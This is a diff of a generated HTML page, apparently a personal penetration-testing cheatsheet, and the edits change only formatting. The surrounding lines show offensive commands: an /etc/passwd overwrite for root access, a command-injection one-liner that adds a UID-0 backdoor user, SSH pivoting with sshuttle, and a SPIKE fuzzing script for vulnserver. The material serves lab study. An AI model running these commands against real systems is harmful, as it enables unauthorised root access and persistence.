@@ -48,7 +48,7 @@ Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a ful
 <meta itemprop="description" content="My humble cheatsheet of most used tools, webs, etc">
 <meta itemprop="datePublished" content="2020-04-07T02:30:30&#43;00:00" />
 <meta itemprop="dateModified" content="2020-04-07T02:30:30&#43;00:00" />
-<meta itemprop="wordCount" content="2204">
+<meta itemprop="wordCount" content="2203">
 <meta itemprop="image" content="https://ceso.github.io/images/cheatsheet/banner.jpg">
 
 
@@ -506,7 +506,7 @@ Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a ful
 
     
     </li><li>
-          <a href="#fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command)</a>
+          <a href="#fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command</a>
     
 
     
@@ -772,7 +772,7 @@ Victim:
 
 
 <p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Host fw.example.mgmt
+<pre><code class="language-console" data-lang="console">Host fw.example.mgmt
   Hostname 192.168.20.35
   User userOnFw
   IdentityFile ~/.ssh/priv_key_fw
@@ -781,7 +781,7 @@ Host foreman.example.mgmt
   User root
   ProxyJump fw.example.mgmt
   IdentityFile ~/.ssh/priv_key_internal
-</code></pre></div><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
+</code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
 <pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;
 
 Later on is possible to connect from the local machine:
@@ -842,13 +842,10 @@ cp /etc/passwd /tmp/passwd.custom
 </code></pre><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p>
 <pre><code class="language-console" data-lang="console">cd /
 /home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
-    
-And finally, just login with the user created with root privileges by using `customPassword`:
-
-```console
-su - ceso
+</code></pre><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p>
+<pre><code class="language-console" data-lang="console">su - ceso
 </code></pre><h4 id="command-web-injection-add-user">Command web injection: add user</h4>
-<pre><code>/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
+<pre><code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
 </code></pre><h4 id="nfs-no_root_squashinsecurerw">NFS; no_root_squash,insecure,rw</h4>
 <p>If <code>/etc/exports</code> has a line like:</p>
 <pre><code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
@@ -905,7 +902,7 @@ echo %PROCESSOR_ARCHITECTURE%
 <li>6 - Find return address (JMP ESP)</li>
 <li>7 - Create payload</li>
 </ul>
-<h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command)</h3>
+<h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command</h3>
 <pre><code class="language-console" data-lang="console">cat &gt; trun.spk &lt;&lt;EOF
 s_readline();
 s_string(&quot;TRUN &quot;);
